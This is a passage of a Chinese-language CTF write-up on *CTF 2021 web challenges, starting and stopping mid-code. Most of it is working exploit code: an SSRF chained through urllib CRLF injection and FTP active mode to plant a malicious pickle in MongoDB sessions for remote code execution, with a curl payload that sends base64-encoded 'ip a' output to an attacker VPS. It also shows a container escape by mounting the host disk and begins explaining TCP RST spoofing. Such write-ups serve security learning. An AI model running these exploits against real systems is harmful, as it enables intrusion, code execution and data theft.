\</span><br><span class="line">            b64decode(sheep)[<span class="number">96</span>:]</span><br><span class="line">        treasure = b64encode(treasure).decode()</span><br><span class="line">        coin = ses.post(<span class="string">&#x27;http://52.149.144.45:8080/lottery/info&#x27;</span>, data=&#123;</span><br><span class="line">            <span class="string">&#x27;enc&#x27;</span>: treasure</span><br><span class="line">        &#125;).json()[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">        amount += coin</span><br><span class="line">        ses.post(<span class="string">&#x27;http://52.149.144.45:8080/lottery/charge&#x27;</span>, data=&#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: flag_user[<span class="string">&#x27;uuid&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;coin&#x27;</span>: coin,</span><br><span class="line">            <span class="string">&#x27;enc&#x27;</span>: treasure</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="built_in">print</span>(amount)</span><br><span class="line"></span><br><span class="line">ses.post(<span class="string">&#x27;http://52.149.144.45:8080/flag&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;api_token&#x27;</span>: flag_user[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>    </div></div><h2 id="oh-my-bet">oh-my-bet</h2><p>上来就是个注册页面，然而头像的选择实现得很怪，提交的表单中是<code>1.png</code>这样的文件名一样的东西，尝试目录穿越，发现确实可以读到<code>/etc/passwd</code><br>遂尝试读<code>/proc/self/cmdline</code>等，获取到源码，顺藤摸瓜看到<code>/app/utils.py</code>与<code>/app/config.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># utils.py</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_avatar</span>(<span class="params">username</span>):</span><br><span class="line">    dirpath = os.path.dirname(__file__)</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    avatar = user.avatar</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;.+:.+&#x27;</span>, avatar):</span><br><span class="line">        path = avatar</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        path = <span class="string">&#x27;/&#x27;</span>.join([<span class="string">&#x27;file:/&#x27;</span>, dirpath, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;avatar&#x27;</span>, avatar])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = base64.b64encode(urllib.request.urlopen(path).read())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_path = <span class="string">&#x27;/&#x27;</span>.join([<span class="string">&#x27;file:/&#x27;</span>, dirpath, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;avatar&#x27;</span>, <span class="string">&#x27;error.png&#x27;</span>])</span><br><span class="line">        content = base64.b64encode(urllib.request.urlopen(error_path).read())</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure><p><code>utils.py</code>告诉我们用户头像是访问注册时提交的链接得到的，之后会缓存于redis中。观察可得此处的头像获取是个<code>urllib</code>任意协议ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.py</span></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ftp_login</span>(<span class="params">self</span>):</span><br><span class="line">        ftp = FTP()</span><br><span class="line">        ftp.connect(<span class="string">&quot;172.20.0.2&quot;</span>, <span class="number">8877</span>)</span><br><span class="line">        ftp.login(<span class="string">&quot;fan&quot;</span>, <span class="string">&quot;root&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ftp</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_config</span>(<span class="params">self</span>):</span><br><span class="line">        f = <span class="variable language_">self</span>.ftp_login()</span><br><span class="line">        f.cwd(<span class="string">&quot;files&quot;</span>)</span><br><span class="line">        buf_size = <span class="number">1024</span></span><br><span class="line">        f.retrbinary(<span class="string">&#x27;RETR &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;config.json&#x27;</span>), <span class="variable language_">self</span>.callback, buf_size)</span><br></pre></td></tr></table></figure><p><code>config.py</code>又告诉我们flask启动时的环境变量位于<code>172.20.0.2</code>的ftp服务器中。利用上面的ssrf来取得config.json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;secret_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;f4545478ee86$%^&amp;&amp;%$#&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DEBUG&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SESSION_TYPE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mongodb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;REMOTE_MONGO_IP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.20.0.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;REMOTE_MONGO_PORT&quot;</span><span class="punctuation">:</span> <span class="number">27017</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SESSION_MONGODB_DB&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SESSION_MONGODB_COLLECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sessions&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SESSION_PERMANENT&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SESSION_USE_SIGNER&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SESSION_KEY_PREFIX&quot;</span><span class="punctuation">:</span> <span class="string">&quot;session:&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SQLALCHEMY_DATABASE_URI&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SQLALCHEMY_TRACK_MODIFICATIONS&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;REDIS_URL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;redis://@172.20.0.4:6379/0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>此时我们发现内网有<code>172.20.0.0/29</code>共五台服务器（1为宿主机，不计）<br>mysql估计是出题人想用来存payload审payload的，没啥用，hint也说了不要管redis，重点在于mongodb中存储了session对象。<br>题目用到了<code>flask_session</code>，而<code>flask_session</code>使用的serializer默认是pickle（貌似现在也不支持改），也就是说只要能将恶意pickle数据塞到mongodb里就可以了</p><p>经尝试，利用<code>ftp://fan:root@172.20.0.2/</code>这样的url可以列出ftp服务器内的文件，下载<code>ftp-server.py</code><br>首先看权限：<code>authorizer.add_user(&quot;fan&quot;, &quot;root&quot;, &quot;.&quot;, perm=&quot;elrafmwMT&quot;)</code>，有权限写</p><p>urllib这个ssrf还能怎么样进一步利用呢？略作百(gu)度(ge)可以找到<a href="https://bugs.python.org/issue36276">这个CVE</a><br>不出意料，urllib在题目环境的版本中存在CRLF注入，我们可以在url的任意一个part注入换行符。这样，我们就可以完整地控制ftp客户端的行为了。</p><p>参考<a href="http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">这篇文章</a>，我们发现ftp竟然还有主动模式这一说。<br>plaid里的这道题利用ftp主动模式可以将ftp服务器内可控的二进制文件发送到任意ip的任意端口，对这道题来说问题就在于如何控制ftp服务器里的文件。<br>经尝试（其实也能搜到），主动模式不仅可以用于文件的下载，还可以用于文件的上传。也就是说只要指示ftp服务器到我们自己的服务器来下载文件就好了。</p><p>此时，我们成功地将CRLF注入型SSRF提升为了完整的无状态二进制流SSRF（自己瞎起的名字），类似gopher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">bind = <span class="string">&#x27;自己的IP:端口&#x27;</span></span><br><span class="line">targ = <span class="string">&#x27;SSRF的目标IP:端口&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_port_cmd</span>(<span class="params">host</span>):</span><br><span class="line">    host, port = host.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    port = <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;PORT &#x27;</span> + <span class="string">&#x27;,&#x27;</span>.join(host.split(<span class="string">&#x27;.&#x27;</span>) + [<span class="built_in">str</span>(port // <span class="number">256</span>), <span class="built_in">str</span>(port - port // <span class="number">256</span> * <span class="number">256</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">cmd</span>):</span><br><span class="line">    cmd = <span class="string">&#x27;\r\n&#x27;</span>.join(cmd)</span><br><span class="line">    <span class="keyword">return</span> ssrf(<span class="string">f&#x27;&#x27;&#x27;ftp://fan:root<span class="subst">&#123;cmd&#125;</span>@<span class="subst">&#123;ftpd&#125;</span>/&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendfile</span>(<span class="params">file</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="built_in">int</span>(bind.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])))</span><br><span class="line">    sock.listen(<span class="number">1</span>)</span><br><span class="line">    (client, address) = sock.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;accepted&#x27;</span>, address)</span><br><span class="line">    client.send(file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sent&#x27;</span>)</span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line">thread = threading.Thread(target=sendfile, args=(request,))</span><br><span class="line">thread.start()</span><br><span class="line">inject([<span class="string">&#x27;TYPE I&#x27;</span>, get_port_cmd(bind), <span class="string">&#x27;STOR frankli&#x27;</span>])</span><br><span class="line">thread.join()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;replaying&#x27;</span>)</span><br><span class="line">inject([<span class="string">&#x27;TYPE I&#x27;</span>, get_port_cmd(targ), <span class="string">&#x27;RETR frankli&#x27;</span>])</span><br></pre></td></tr></table></figure><p>接下来的任务就是向mongodb发起一个update请求，修改数据库里的session序列化数据。如何构造这个数据包呢，我赛后问了出题人和别的队伍的同学，基本有下面几种：</p><ol><li>分析mongodb数据包，并手动构造（肝败吓疯）</li><li>查<a href="https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/">文档</a>，手动构造</li><li>抓包重放（出题人）</li><li>我的办法</li></ol><p>我的办法比较脏，但是也比较好玩。众所周知python啥都能干，比如pymongo。然而pymongo是主动去连服务器的，怎么获取到数据包本身呢？<br>改代码呗，去<code>site-packages/pymongo/network.py:142</code>，在sendall之前丢  个  异  常</p><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/exception.png" class="" title="我看是你脑子有异常"><p>然后就可以愉快地拿到mongo请求了。<br>只是有一点要注意，下面这个脚本跑的时候在localhost也得启动一个mongo实例/docker，不然pymongo发别的ping包之类的会阻塞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pickle</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line">    <span class="keyword">return</span> pickle.dumps(exp())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mongo</span>(<span class="params">cmd</span>):</span><br><span class="line">    client = MongoClient(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">27017</span>)</span><br><span class="line">    coll = client.admin.sessions</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        coll.update_one(</span><br><span class="line">            &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;session:37386ce1-3fe8-4f1d-91fc-224581c5279f&#x27;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;$set&quot;</span>: &#123; <span class="string">&quot;val&quot;</span>: get_pickle(cmd) &#125;&#125;,</span><br><span class="line">            upsert=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e.message</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(get_mongo(<span class="string">&#x27;ls&#x27;</span>))</span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        剩下的exploit    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_id</span>():</span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase + string.digits)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([random.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_port_cmd</span>(<span class="params">host</span>):</span><br><span class="line">    host, port = host.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    port = <span class="built_in">int</span>(port)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;PORT &#x27;</span> + <span class="string">&#x27;,&#x27;</span>.join(host.split(<span class="string">&#x27;.&#x27;</span>) + [<span class="built_in">str</span>(port // <span class="number">256</span>), <span class="built_in">str</span>(port - port // <span class="number">256</span> * <span class="number">256</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;http://52.163.52.206:8088&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;http://23.98.68.11:8088&#x27;</span></span><br><span class="line"></span><br><span class="line">ftpd = <span class="string">&#x27;172.20.0.2:8877&#x27;</span></span><br><span class="line">redis = <span class="string">&#x27;172.20.0.4:6379&#x27;</span></span><br><span class="line">mongo = <span class="string">&#x27;172.20.0.5:27017&#x27;</span></span><br><span class="line"></span><br><span class="line">bind = <span class="string">&#x27;vps_ip:2334&#x27;</span></span><br><span class="line">targ = mongo</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mongo <span class="keyword">import</span> get_mongo</span><br><span class="line">request = get_mongo(<span class="string">&#x27;curl vps_ip:1234/ -H &quot;Host: `ip a|base64`&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssrf</span>(<span class="params">url</span>):</span><br><span class="line">    page = requests.post(a + <span class="string">&#x27;/login&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: get_random_id(),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: get_random_id(),</span><br><span class="line">        <span class="string">&#x27;avatar&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Go!&#x27;</span></span><br><span class="line">    &#125;).text</span><br><span class="line">    page = page[page.find(<span class="string">&#x27;data:image/png;base64,&#x27;</span>) +</span><br><span class="line">                <span class="built_in">len</span>(<span class="string">&#x27;data:image/png;base64,&#x27;</span>):]</span><br><span class="line">    page = page[:page.find(<span class="string">&#x27;&quot;&#x27;</span>)]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = b64decode(page).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        page = b64decode(page)</span><br><span class="line">    <span class="keyword">return</span> page</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">cmd</span>):</span><br><span class="line">    cmd = <span class="string">&#x27;\r\n&#x27;</span>.join(cmd)</span><br><span class="line">    <span class="keyword">return</span> ssrf(<span class="string">f&#x27;&#x27;&#x27;ftp://fan:root<span class="subst">&#123;cmd&#125;</span>@<span class="subst">&#123;ftpd&#125;</span>/&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendfile</span>(<span class="params">file</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="built_in">int</span>(bind.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])))</span><br><span class="line">    sock.listen(<span class="number">1</span>)</span><br><span class="line">    (client, address) = sock.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;accepted&#x27;</span>, address)</span><br><span class="line">    client.send(file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sent&#x27;</span>)</span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread = threading.Thread(target=sendfile, args=(request,))</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ssrf(<span class="string">f&#x27;ftp://fan:root@<span class="subst">&#123;ftpd&#125;</span>/&#x27;</span>))</span><br><span class="line"></span><br><span class="line">inject([<span class="string">&#x27;TYPE I&#x27;</span>, get_port_cmd(bind), <span class="string">&#x27;STOR frankli&#x27;</span>])</span><br><span class="line">thread.join()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;uploaded&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ssrf(<span class="string">f&#x27;ftp://fan:root@<span class="subst">&#123;ftpd&#125;</span>/&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;replaying&#x27;</span>)</span><br><span class="line">inject([<span class="string">&#x27;TYPE I&#x27;</span>, get_port_cmd(targ), <span class="string">&#x27;RETR frankli&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;replayed&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(requests.get(a, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;1eb74496-98b9-4acc-94fb-75ba15ddb803&#x27;</span>&#125;).headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;requested&#x27;</span>)</span><br><span class="line">inject([<span class="string">&#x27;RNFR frankli&#x27;</span>, <span class="string">&#x27;RNTO trash&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(ssrf(<span class="string">f&#x27;ftp://fan:root@<span class="subst">&#123;ftpd&#125;</span>/&#x27;</span>))</span><br></pre></td></tr></table></figure>    </div></div><h2 id="oh-my-socket">oh-my-socket</h2><p>不行，必须要公开处刑（逃</p><p>为什么题在放出来半个小时后就去fix了呢？</p><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/privileged.png" class="" title="特 权 阶 级"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.system(&#x27;fdisk -l&#x27;)</span></span><br><span class="line">os.system(<span class="string">&#x27;mkdir -p /mnt/test&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;mount /dev/vda1 /mnt/test&#x27;</span>)</span><br><span class="line"><span class="comment"># os.system(&#x27;cat /mnt/test/lib/systemd/system/docker.*&#x27;)</span></span><br><span class="line"><span class="comment"># os.system(&#x27;chroot /mnt/test find . -name &quot;oh-some-funny-code&quot;&#x27;)</span></span><br><span class="line">os.system(<span class="string">&#x27;cat /mnt/test/var/lib/docker/overlay2/*/diff/server/oh-some-funny-code&#x27;</span>)</span><br><span class="line"><span class="comment"># os.system(&#x27;chroot /mnt/test service docker status&#x27;)</span></span><br></pre></td></tr></table></figure><img src="/2021/01/18/Security/Writeup/*CTF-2021-Web/result.png" class="" title="结 束 了"><p>还是我太善良了，没干什么坏事</p><p>这道题的正解是这样的：</p><p>观察题目，我们能发现server上有flag，还有一个flag service。还有一个client，client上还有任意文件读。我们作为webserver可以执行80秒任意代码，并且出题人贴心地为我们装上了scapy便于tcp包的构造。</p><p>这个flag service是阻塞式的服务，也就是说上一个人不断开的话下一个人连不了。然而client上的客户端在启动时就往server那里连了，并且双方都在<strong>阻塞</strong>地等待对方的数据（recv），而且还没设置超时，而且还每两分钟就重启一次。看上去有点不太可能实现的样子。<br>但是当我们仔细观察client的源码，当收到了connection reset（RST）时，client会断开与server端的连接。也就是说我们需要伪造一个从server到client的RST，这时候才能轮到我们去连server。</p><p>众所周知（个鬼啊），TCP数据包伪造的重点在于其seq的值。</p><p>IP头中，Source IP Address，Destination IP Address我们都有，Protocol是TCP，别的无所谓，都是能自动构造好的<br>TCP头中，Source Port，Destination Port我们也都有，client那边都bind好了，问题就在于：<br>双方进行三次握手的过程如下：</p><ol><li>client向server发送一个同步包(SYN)，序列号为随机数A</li><li>1: 服务端响应(ACK)包，序列号为A+1; 2: 服务端发送同步包(SYN)，序列号为随机数B （即一个SYN-ACK包）</li><li>客户端发送响应包，序列号为B+1</li></ol><p>后面的数据包的sequence序列号只能落在<code>(last_seq, last_seq + recv_window)</code>这个范围内。</p><p>参考<a href="https://github.com/torvalds/linux/blob/19c329f6808995b142b3966301f217c831e7cf31/net/ipv4/tcp_input.c#L5609-L5628">linux源码:tcp_validate_incoming</a>，当然RFC或者计网课本都行，只是待会会用到这个</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title">tcp_sequence</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> tcp_sock *tp, u32 seq, u32 end_seq)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">before</span>(end_seq, tp-&gt;rcv_wup) &amp;&amp; !<span class="built_in">after</span>(seq, tp-&gt;rcv_nxt + <span class="built_in">tcp_receive_window</span>(tp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后他俩就静默了。如果有任何一方发送了数据包，我们都有可能能抓到这个包，看到seq，这样这个题将绝杀，可是抓不得。</p><p>顺着出题人的思路，我们找到了几个paper，还找到了一次看雪论坛的演讲：</p><ol><li><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2012/10/ccs12-qian.pdf">https://www.microsoft.com/en-us/research/wp-content/uploads/2012/10/ccs12-qian.pdf</a></li><li><a href="https://web.eecs.umich.edu/~zmao/Papers/oakland12_TCP_sequence_number_inference.pdf">https://web.eecs.umich.edu/~zmao/Papers/oakland12_TCP_sequence_number_inference.pdf</a></li><li><a href="https://bbs.pediy.com/thread-245982.htm#:~:text=%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%94%BB%E5%87%BB%E5%8F%98%E7%A7%8D">https://bbs.pediy.com/thread-245982.htm#:~:text=第二个攻击变种</a></li></ol><p>根据上面的资料，我们继续往下跟刚才的linux中的<code>tcp_validate_incoming</code>，看到如果seq检查不通过的话进到的分支：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!th-&gt;rst) &#123;</span><br><span class="line">    <span class="keyword">if</span> (th-&gt;syn)</span><br><span class="line">        <span class="keyword">goto</span> syn_challenge;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">tcp_oow_rate_limited</span>(<span class="built_in">sock_net</span>(sk), skb, 